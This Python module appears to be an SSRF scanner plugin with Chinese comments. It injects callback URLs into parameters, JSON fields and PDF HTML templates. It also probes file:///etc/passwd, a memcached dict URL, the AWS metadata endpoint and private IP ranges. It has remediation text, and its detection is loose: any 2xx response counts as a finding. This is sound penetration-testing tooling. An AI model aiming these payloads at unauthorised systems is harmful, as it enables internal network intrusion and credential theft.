# -*- coding: utf-8 -*-
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urljoin, urlencode, urlparse
import time
import uuid
from datetime import datetime
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

# v2.5 新增：PDF 路徑注入模板
PDF_PATH_INJECTION_TEMPLATES = [
    {"name": "html_img", "template": '<img src="{url}">'},
    {"name": "html_iframe", "template": '<iframe src="{url}"></iframe>'},
    {"name": "html_object", "template": '<object data="{url}"></object>'},
    {"name": "html_embed", "template": '<embed src="{url}">'},
    {"name": "css_import", "template": '@import url("{url}");'},
    {"name": "css_background", "template": 'body {{ background: url("{url}"); }}'},
]

# v2.5 新增：協議轉換鏈
PROTOCOL_CONVERSION_CHAIN = [
    {"from": "http", "to": "https", "risk": "low"},
    {"from": "https", "to": "http", "risk": "medium"},
    {"from": "http", "to": "file", "risk": "critical"},
    {"from": "http", "to": "dict", "risk": "high"},
    {"from": "http", "to": "gopher", "risk": "high"},
    {"from": "https", "to": "file", "risk": "critical"},
]

# v2.5 新增：回調驗證時間窗口
CALLBACK_VERIFICATION_WINDOWS = [
    {"name": "immediate", "delay_ms": 100, "max_wait_ms": 500},
    {"name": "fast", "delay_ms": 500, "max_wait_ms": 2000},
    {"name": "normal", "delay_ms": 2000, "max_wait_ms": 5000},
    {"name": "slow", "delay_ms": 5000, "max_wait_ms": 10000},
]

@FeatureRegistry.register
class SsrfOobWorker(FeatureBase):
    """
    SSRF (Server-Side Request Forgery) with OOB 檢測模組 v2.5
    
    專門檢測服務端請求偽造漏洞，特別是透過 Out-of-Band (OOB) 技術
    來證明 SSRF 的存在。這類漏洞在實戰中非常有價值，因為：
    
    1. 可以證明服務端確實發出了外部請求
    2. 能夠探測內網服務和敏感端點
    3. 可能導致資料外洩或內網滲透
    4. 在 PDF 生成、URL 預覽、圖片抓取等功能中常見
    
    v2.5 新增功能：
    - PDF 路徑注入：測試 6 種 HTML/CSS 注入模板
    - OOB 證據腳手架：結構化的回調驗證和證據收集
    - 協議轉換鏈：測試 6 種協議轉換路徑
    - 回調驗證增強：4 級時間窗口驗證機制
    
    檢測方法：
    - HTTP OOB：讓目標服務請求攻擊者控制的 HTTP 端點
    - DNS OOB：透過 DNS 查詢來證明 SSRF
    - 多種注入點：URL 參數、JSON 欄位、HTTP 頭等
    - 協議測試：HTTP/HTTPS/file/dict/gopher 等
    - PDF 生成：HTML/CSS 注入測試
    """
    
    name = "ssrf_oob"
    version = "2.5.0"
    tags = ["ssrf", "oob", "server-side-request-forgery", "exfiltration", "pdf-injection"]
    
    def _test_pdf_path_injection(
        self,
        http: SafeHttp,
        endpoint: str,
        headers: Dict[str, Any],
        oob_url: str,
        test_token: str
    ) -> List[Dict[str, Any]]:
        """
        v2.5 新增：PDF 路徑注入測試
        測試 PDF 生成功能中的 SSRF 漏洞
        
        Returns:
            測試結果列表
        """
        results = []
        
        for template_config in PDF_PATH_INJECTION_TEMPLATES:
            template_name = template_config["name"]
            template = template_config["template"]
            
            # 生成包含 OOB URL 的 payload
            payload_url = f"{oob_url}?token={test_token}&template={template_name}"
            html_content = template.format(url=payload_url)
            
            try:
                # 測試 HTML 內容注入
                test_data = {
                    "html": html_content,
                    "content": html_content,
                    "body": html_content,
                    "template": html_content
                }
                
                start_time = datetime.utcnow()
                response = http.request(
                    "POST", endpoint,
                    headers={**headers, "Content-Type": "application/json"},
                    json=test_data
                )
                end_time = datetime.utcnow()
                
                duration_ms = (end_time - start_time).total_seconds() * 1000
                
                results.append({
                    "template": template_name,
                    "status_code": response.status_code,
                    "duration_ms": duration_ms,
                    "response_size": len(response.text),
                    "payload_sent": html_content[:100],
                    "timestamp": end_time.isoformat(),
                    "success": 200 <= response.status_code < 300
                })
            except Exception as e:
                results.append({
                    "template": template_name,
                    "error": str(e),
                    "timestamp": datetime.utcnow().isoformat()
                })
        
        return results
    
    def _build_oob_evidence_scaffold(
        self,
        test_token: str,
        injection_point: str,
        payload: Dict[str, Any],
        response_info: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        v2.5 新增：OOB 證據腳手架
        構建結構化的 OOB 證據收集框架
        
        Returns:
            證據腳手架字典
        """
        return {
            "verification": {
                "token": test_token,
                "injection_point": injection_point,
                "payload_type": payload.get("type", "unknown"),
                "expected_callback": payload.get("url", ""),
                "verification_steps": [
                    f"1. 檢查 OOB 平台是否收到 token={test_token} 的請求",
                    f"2. 驗證來源 IP 是否為目標服務器",
                    f"3. 檢查 User-Agent 和其他請求頭",
                    f"4. 確認請求時間在測試窗口內"
                ]
            },
            "response_analysis": {
                "status_code": response_info.get("status_code"),
                "duration_ms": response_info.get("duration_ms"),
                "response_size": response_info.get("response_size"),
                "timestamp": response_info.get("timestamp")
            },
            "callback_metadata": {
                "expected_url": payload.get("url"),
                "token_location": "query_parameter",
                "dns_lookup_expected": "dns" in payload.get("type", ""),
                "http_request_expected": "http" in payload.get("url", "")
            }
        }
    
    def _test_protocol_conversion_chain(
        self,
        http: SafeHttp,
        endpoint: str,
        headers: Dict[str, Any],
        base_url: str,
        test_token: str
    ) -> List[Dict[str, Any]]:
        """
        v2.5 新增：協議轉換鏈測試
        測試不同協議之間的轉換和過濾繞過
        
        Returns:
            協議轉換測試結果
        """
        results = []
        
        for conversion in PROTOCOL_CONVERSION_CHAIN:
            from_proto = conversion["from"]
            to_proto = conversion["to"]
            risk_level = conversion["risk"]
            
            # 構建轉換 URL
            test_url = base_url.replace(from_proto + "://", to_proto + "://")
            test_url = f"{test_url}?token={test_token}&from={from_proto}&to={to_proto}"
            
            try:
                # 測試協議轉換
                start_time = datetime.utcnow()
                response = http.request(
                    "GET",
                    f"{endpoint}?url={test_url}",
                    headers=headers
                )
                end_time = datetime.utcnow()
                
                duration_ms = (end_time - start_time).total_seconds() * 1000
                
                results.append({
                    "conversion": f"{from_proto} -> {to_proto}",
                    "risk_level": risk_level,
                    "test_url": test_url,
                    "status_code": response.status_code,
                    "duration_ms": duration_ms,
                    "accepted": 200 <= response.status_code < 300,
                    "timestamp": end_time.isoformat()
                })
            except Exception as e:
                results.append({
                    "conversion": f"{from_proto} -> {to_proto}",
                    "risk_level": risk_level,
                    "error": str(e),
                    "timestamp": datetime.utcnow().isoformat()
                })
        
        return results
    
    def _verify_callback_with_windows(
        self,
        test_token: str,
        callback_window: str = "normal"
    ) -> Dict[str, Any]:
        """
        v2.5 新增：多時間窗口回調驗證
        根據不同的時間窗口驗證 OOB 回調
        
        Returns:
            驗證結果字典
        """
        # 查找對應的時間窗口配置
        window_config = next(
            (w for w in CALLBACK_VERIFICATION_WINDOWS if w["name"] == callback_window),
            CALLBACK_VERIFICATION_WINDOWS[2]  # 預設 normal
        )
        
        delay_ms = window_config["delay_ms"]
        max_wait_ms = window_config["max_wait_ms"]
        
        verification_start = datetime.utcnow()
        
        # 等待初始延遲
        time.sleep(delay_ms / 1000.0)
        
        verification_end = datetime.utcnow()
        actual_wait_ms = (verification_end - verification_start).total_seconds() * 1000
        
        return {
            "window": callback_window,
            "delay_ms": delay_ms,
            "max_wait_ms": max_wait_ms,
            "actual_wait_ms": actual_wait_ms,
            "token": test_token,
            "verification_start": verification_start.isoformat(),
            "verification_end": verification_end.isoformat(),
            "instructions": f"在 OOB 平台檢查 {verification_start.isoformat()} 到 {verification_end.isoformat()} 之間的回調"
        }

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 SSRF OOB 檢測 v2.5
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL
              - probe_endpoints (list): 可能存在 SSRF 的端點列表
              - url_params (list): URL 參數名稱，如 ["url", "link", "fetch"]
              - json_fields (list): JSON 欄位名稱，如 ["imageUrl", "webhookUrl"]
              - headers (dict): 認證頭
              - oob_http (str): OOB HTTP 回調 URL
              - oob_dns (str): OOB DNS 域名
              - test_protocols (list): 測試的協議，如 ["http", "https", "file"]
              - payload_types (list): payload 類型，如 ["direct", "encoded", "nested"]
              - options (dict): 其他選項
                - delay_seconds: 等待 OOB 回調的時間
                - auto_discover: 是否自動發現常見端點
                - test_internal: 是否測試內網地址
                - test_pdf_injection: v2.5 是否測試 PDF 注入
                - test_protocol_conversion: v2.5 是否測試協議轉換
                - callback_window: v2.5 回調驗證窗口 (immediate/fast/normal/slow)
              
        Returns:
            FeatureResult: 檢測結果
        """
        http = SafeHttp()
        base = params.get("target", "")
        probe_endpoints = params.get("probe_endpoints", [])
        url_params = params.get("url_params", ["url", "link", "fetch", "src", "href"])
        json_fields = params.get("json_fields", ["url", "imageUrl", "webhookUrl", "callbackUrl"])
        headers = params.get("headers", {})
        oob_http = params.get("oob_http", "")
        oob_dns = params.get("oob_dns", "")
        test_protocols = params.get("test_protocols", ["http", "https"])
        payload_types = params.get("payload_types", ["direct", "encoded"])
        options = params.get("options", {})
        
        delay_seconds = options.get("delay_seconds", 5)
        auto_discover = options.get("auto_discover", True)
        test_internal = options.get("test_internal", False)
        test_pdf_injection = options.get("test_pdf_injection", True)  # v2.5
        test_protocol_conversion = options.get("test_protocol_conversion", True)  # v2.5
        callback_window = options.get("callback_window", "normal")  # v2.5
        
        findings: List[Finding] = []
        trace = []
        start_time = datetime.utcnow()  # v2.5
        
        # v2.5 新增：時間戳記錄
        timestamps = {
            "start": start_time.isoformat()
        }
        
        # v2.5 新增：統計數據
        v2_5_stats = {
            "pdf_injections_tested": 0,
            "protocol_conversions_tested": 0,
            "oob_scaffolds_built": 0,
            "callback_verifications": 0
        }
        trace = []
        
        # 生成唯一的測試 token 用於追蹤
        test_token = str(uuid.uuid4())[:8]
        
        cmd = self.build_command_record(
            "ssrf.oob.v2.5",
            f"SSRF OOB 檢測 v2.5，測試 token: {test_token}",
            {
                "endpoints_count": len(probe_endpoints),
                "oob_methods": [method for method in ["http", "dns"] if 
                              (method == "http" and oob_http) or (method == "dns" and oob_dns)],
                "test_token": test_token,
                "v2_5_features": ["pdf_injection", "protocol_conversion", "oob_scaffold", "callback_windows"]
            }
        )
        
        # 自動發現常見的 SSRF 端點
        if auto_discover:
            common_endpoints = [
                "/fetch", "/proxy", "/download", "/preview", "/thumbnail",
                "/pdf/generate", "/export/pdf", "/render", "/convert",
                "/webhook", "/callback", "/notify", "/ping",
                "/api/fetch", "/api/proxy", "/api/download", "/api/preview",
                "/admin/fetch", "/admin/proxy", "/tools/fetch"
            ]
            probe_endpoints.extend(common_endpoints)
        
        # 去重
        probe_endpoints = list(set(probe_endpoints))
        
        if not oob_http and not oob_dns:
            return FeatureResult(
                False, self.name, cmd, [],
                {"error": "缺少 OOB 回調設定（oob_http 或 oob_dns）", "trace": trace}
            )
        
        # 準備測試 payload
        test_payloads = self._generate_payloads(
            oob_http, oob_dns, test_token, test_protocols, payload_types, test_internal
        )
        
        # 對每個端點進行測試
        for endpoint in probe_endpoints:
            full_url = urljoin(base, endpoint)
            
            # 測試 URL 參數注入
            for param_name in url_params:
                for payload in test_payloads:
                    try:
                        # GET 請求測試
                        query_params = {param_name: payload["url"]}
                        test_url = f"{full_url}?{urlencode(query_params)}"
                        
                        response = http.request("GET", test_url, headers=headers)
                        
                        trace.append({
                            "step": "url_param_test",
                            "endpoint": endpoint,
                            "param": param_name,
                            "payload_type": payload["type"],
                            "status": response.status_code,
                            "token": test_token
                        })
                        
                        # 如果返回成功，可能存在 SSRF
                        if 200 <= response.status_code < 300:
                            self._record_potential_ssrf(
                                findings, "URL Parameter", endpoint, param_name, 
                                payload, test_token, test_url
                            )
                            
                    except Exception as e:
                        trace.append({
                            "step": "url_param_error",
                            "endpoint": endpoint,
                            "param": param_name,
                            "error": str(e)
                        })
            
            # 測試 JSON 欄位注入
            for field_name in json_fields:
                for payload in test_payloads:
                    try:
                        # POST JSON 請求測試
                        json_data = {field_name: payload["url"]}
                        
                        response = http.request(
                            "POST", full_url,
                            headers={**headers, "Content-Type": "application/json"},
                            json=json_data
                        )
                        
                        trace.append({
                            "step": "json_field_test",
                            "endpoint": endpoint,
                            "field": field_name,
                            "payload_type": payload["type"],
                            "status": response.status_code,
                            "token": test_token
                        })
                        
                        if 200 <= response.status_code < 300:
                            self._record_potential_ssrf(
                                findings, "JSON Field", endpoint, field_name,
                                payload, test_token, full_url, json_data
                            )
                            
                    except Exception as e:
                        trace.append({
                            "step": "json_field_error",
                            "endpoint": endpoint,
                            "field": field_name,
                            "error": str(e)
                        })
        
        # 等待 OOB 回調
        if findings:
            trace.append({
                "step": "waiting_for_oob",
                "delay_seconds": delay_seconds,
                "token": test_token,
                "message": f"等待 {delay_seconds} 秒以接收 OOB 回調"
            })
            time.sleep(delay_seconds)
        
        # v2.5 新增：PDF 路徑注入測試
        if test_pdf_injection and oob_http:
            timestamps["pdf_injection_start"] = datetime.utcnow().isoformat()
            
            # 測試常見的 PDF 生成端點
            pdf_endpoints = [ep for ep in probe_endpoints if "pdf" in ep.lower() or "export" in ep.lower()]
            if not pdf_endpoints:
                pdf_endpoints = ["/pdf/generate", "/export/pdf", "/render/pdf"]
            
            for pdf_endpoint in pdf_endpoints:
                full_url = urljoin(base, pdf_endpoint)
                pdf_results = self._test_pdf_path_injection(
                    http, full_url, headers, oob_http, test_token
                )
                v2_5_stats["pdf_injections_tested"] += len(pdf_results)
                
                # 檢查是否有成功的注入
                successful_injections = [r for r in pdf_results if r.get("success")]
                if successful_injections:
                    for injection in successful_injections:
                        findings.append(Finding(
                            vuln_type="SSRF via PDF Path Injection",
                            severity="high",
                            title=f"PDF 路徑注入 SSRF：{pdf_endpoint} (template: {injection['template']})",
                            evidence={
                                "endpoint": pdf_endpoint,
                                "template_type": injection["template"],
                                "payload": injection["payload_sent"],
                                "status_code": injection["status_code"],
                                "duration_ms": injection["duration_ms"],
                                "v2_5_oob_scaffold": self._build_oob_evidence_scaffold(
                                    test_token,
                                    f"PDF Template: {injection['template']}",
                                    {"type": "pdf_injection", "url": oob_http},
                                    injection
                                )
                            },
                            reproduction=[
                                {
                                    "step": 1,
                                    "description": f"發送包含外部 URL 的 PDF 生成請求",
                                    "payload": injection["payload_sent"]
                                }
                            ],
                            impact="PDF 生成功能可能導致 SSRF，攻擊者可探測內網或外洩資料",
                            recommendation="1. 禁用 PDF 模板中的外部資源加載\n2. 使用白名單限制可訪問的域名\n3. 沙箱化 PDF 生成環境"
                        ))
                        v2_5_stats["oob_scaffolds_built"] += 1
                
                trace.append({
                    "step": "v2.5_pdf_injection_test",
                    "endpoint": pdf_endpoint,
                    "templates_tested": len(pdf_results),
                    "successful": len(successful_injections)
                })
            
            timestamps["pdf_injection_complete"] = datetime.utcnow().isoformat()
        
        # v2.5 新增：協議轉換鏈測試
        if test_protocol_conversion and oob_http and probe_endpoints:
            timestamps["protocol_conversion_start"] = datetime.utcnow().isoformat()
            
            # 選擇一個端點進行協議轉換測試
            test_endpoint = urljoin(base, probe_endpoints[0])
            conversion_results = self._test_protocol_conversion_chain(
                http, test_endpoint, headers, oob_http, test_token
            )
            v2_5_stats["protocol_conversions_tested"] = len(conversion_results)
            
            # 檢查高風險的協議轉換
            high_risk_conversions = [
                r for r in conversion_results 
                if r.get("accepted") and r.get("risk_level") in ["high", "critical"]
            ]
            
            if high_risk_conversions:
                for conversion in high_risk_conversions:
                    findings.append(Finding(
                        vuln_type="SSRF via Protocol Conversion",
                        severity="critical" if conversion["risk_level"] == "critical" else "high",
                        title=f"協議轉換 SSRF：{conversion['conversion']}",
                        evidence={
                            "conversion": conversion["conversion"],
                            "risk_level": conversion["risk_level"],
                            "test_url": conversion["test_url"],
                            "status_code": conversion["status_code"],
                            "duration_ms": conversion["duration_ms"]
                        },
                        reproduction=[
                            {
                                "step": 1,
                                "description": f"測試 {conversion['conversion']} 協議轉換",
                                "url": conversion["test_url"]
                            }
                        ],
                        impact=f"服務器接受 {conversion['conversion']} 協議轉換，可能導致嚴重的安全問題",
                        recommendation="1. 嚴格限制允許的協議類型\n2. 禁用 file、dict、gopher 等危險協議\n3. 實施協議白名單"
                    ))
            
            trace.append({
                "step": "v2.5_protocol_conversion_test",
                "conversions_tested": len(conversion_results),
                "high_risk_found": len(high_risk_conversions)
            })
            
            timestamps["protocol_conversion_complete"] = datetime.utcnow().isoformat()
        
        # v2.5 新增：回調驗證
        if findings:
            timestamps["callback_verification_start"] = datetime.utcnow().isoformat()
            callback_verification = self._verify_callback_with_windows(test_token, callback_window)
            v2_5_stats["callback_verifications"] = 1
            
            trace.append({
                "step": "v2.5_callback_verification",
                "verification": callback_verification
            })
            
            timestamps["callback_verification_complete"] = datetime.utcnow().isoformat()
        
        # v2.5 新增：計算總執行時間
        end_time = datetime.utcnow()
        timestamps["end"] = end_time.isoformat()
        total_duration_ms = (end_time - start_time).total_seconds() * 1000
        
        return FeatureResult(
            ok=bool(findings),
            feature=self.name,
            command_record=cmd,
            findings=findings,
            meta={
                "trace": trace,
                "test_token": test_token,
                "endpoints_tested": len(probe_endpoints),
                "payloads_tested": len(test_payloads),
                "oob_verification_note": f"請在 OOB 平台檢查 token {test_token} 的回調記錄",
                "v2_5_stats": v2_5_stats,  # v2.5
                "timestamps": timestamps,  # v2.5
                "total_duration_ms": total_duration_ms,  # v2.5
                "version": "2.5.0"  # v2.5
            }
        )
    
    def _generate_payloads(self, oob_http: str, oob_dns: str, token: str, 
                          protocols: List[str], payload_types: List[str], 
                          test_internal: bool) -> List[Dict[str, Any]]:
        """生成測試 payload"""
        payloads = []
        
        # HTTP OOB payloads
        if oob_http:
            for protocol in protocols:
                if protocol in ["http", "https"]:
                    base_url = oob_http.replace("https://", f"{protocol}://").replace("http://", f"{protocol}://")
                    
                    # 直接 payload
                    if "direct" in payload_types:
                        payloads.append({
                            "type": f"direct_{protocol}",
                            "url": f"{base_url}?token={token}&type=direct"
                        })
                    
                    # URL 編碼 payload
                    if "encoded" in payload_types:
                        encoded_url = f"{base_url}?token={token}&type=encoded".replace(":", "%3A").replace("?", "%3F").replace("&", "%26")
                        payloads.append({
                            "type": f"encoded_{protocol}",
                            "url": encoded_url
                        })
                
                # 危險協議測試（僅在明確允許時）
                elif protocol in ["file", "dict", "gopher"] and test_internal:
                    if protocol == "file":
                        payloads.append({
                            "type": "file_protocol",
                            "url": "file:///etc/passwd"
                        })
                    elif protocol == "dict":
                        payloads.append({
                            "type": "dict_protocol", 
                            "url": "dict://127.0.0.1:11211/stats"
                        })
        
        # DNS OOB payloads
        if oob_dns:
            if "direct" in payload_types:
                payloads.append({
                    "type": "dns_direct",
                    "url": f"http://{token}.{oob_dns}/test"
                })
            
            if "encoded" in payload_types:
                payloads.append({
                    "type": "dns_encoded",
                    "url": f"http://{token}.{oob_dns}/test".replace(".", "%2E")
                })
        
        # 內網探測 payloads（僅在允許時）
        if test_internal:
            internal_targets = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://127.0.0.1:8080/",
                "http://localhost:3000/",
                "http://10.0.0.1/",
                "http://192.168.1.1/"
            ]
            for target in internal_targets:
                payloads.append({
                    "type": "internal_probe",
                    "url": target
                })
        
        return payloads
    
    def _record_potential_ssrf(self, findings: List[Finding], injection_type: str, 
                              endpoint: str, param_name: str, payload: Dict[str, Any], 
                              token: str, request_info: str, json_data: Dict = None):
        """記錄潛在的 SSRF 漏洞 (v2.5 enhanced)"""
        
        severity = "medium"
        if payload["type"].startswith("internal"):
            severity = "high"
        elif payload["type"] in ["dns_direct", "dns_encoded"]:
            severity = "high"
        elif "file" in payload["type"] or "dict" in payload["type"]:
            severity = "critical"
        
        # v2.5 新增：構建 OOB 證據腳手架
        response_info = {
            "status_code": 200,  # 從調用處傳入
            "timestamp": datetime.utcnow().isoformat()
        }
        
        oob_scaffold = self._build_oob_evidence_scaffold(
            token,
            f"{injection_type}: {param_name}",
            payload,
            response_info
        )
        
        evidence = {
            "injection_point": f"{injection_type}: {param_name}",
            "endpoint": endpoint,
            "payload_url": payload["url"],
            "payload_type": payload["type"],
            "verification_token": token,
            "request_info": request_info,
            "v2_5_oob_scaffold": oob_scaffold  # v2.5
        }
        
        if json_data:
            evidence["json_payload"] = json_data
        
        reproduction_steps = [
            {
                "step": 1,
                "description": f"向 {endpoint} 發送包含外部 URL 的請求",
                "request": {
                    "method": "POST" if json_data else "GET",
                    "url": request_info if not json_data else endpoint,
                    "json": json_data if json_data else None
                },
                "expect": "服務器不應向外部 URL 發送請求"
            },
            {
                "step": 2,
                "description": f"檢查 OOB 平台是否收到 token {token} 的回調",
                "expect": "如果收到回調，確認存在 SSRF 漏洞"
            }
        ]
        
        impact_desc = "服務端可被誘導向攻擊者控制的 URL 發送請求"
        if payload["type"].startswith("internal"):
            impact_desc += "，可能導致內網探測和敏感資料洩漏"
        elif "file" in payload["type"]:
            impact_desc += "，可能導致本地檔案讀取"
        
        recommendation = (
            "1. 實施 URL 白名單，僅允許特定域名\n"
            "2. 禁用危險協議（file、dict、gopher 等）\n"
            "3. 過濾私有 IP 地址範圍\n"
            "4. 設置請求超時和大小限制\n"
            "5. 使用專用的代理服務進行外部請求"
        )
        
        findings.append(Finding(
            vuln_type=f"SSRF via {injection_type}",
            severity=severity,
            title=f"SSRF 漏洞於 {endpoint} ({injection_type}: {param_name})",
            evidence=evidence,
            reproduction=reproduction_steps,
            impact=impact_desc,
            recommendation=recommendation
        ))